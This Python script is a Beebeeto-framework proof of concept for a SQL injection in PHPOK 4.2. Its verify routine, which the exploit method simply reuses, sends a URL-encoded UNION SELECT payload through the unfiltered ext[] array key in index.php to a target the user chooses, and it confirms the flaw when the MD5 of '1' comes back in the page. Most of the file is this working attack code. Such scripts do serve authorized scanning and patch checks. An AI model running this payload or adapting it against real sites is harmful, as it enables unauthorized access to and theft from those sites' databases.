#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0078',
            'name': 'PHPOK 4.2 /framework/www/project_control.php SQL注入漏洞 POC',
            'author': 'abagoforgans',
            'create_date': '2014-10-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPOK',
            'vul_version': ['4.2'],
            'type': 'SQL Injection',
            'tag': ['PHPOK漏洞', 'SQL注入漏洞'],
            'desc': 'PHPOK 4.2 /framework/www/project_control.php中数组$key在未过滤情况下带入SQL语句',
            'references': ['http://loudong.360.cn/vul/info/id/13485',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        payload = ("/index.php?c=project&id=product&ext[id%3D0%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2Cmd5(1)"
                   "%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26"
                   "%2C27%2C28%23]=exp")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "c4ca4238a0b923820dcc509a6f75849b" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())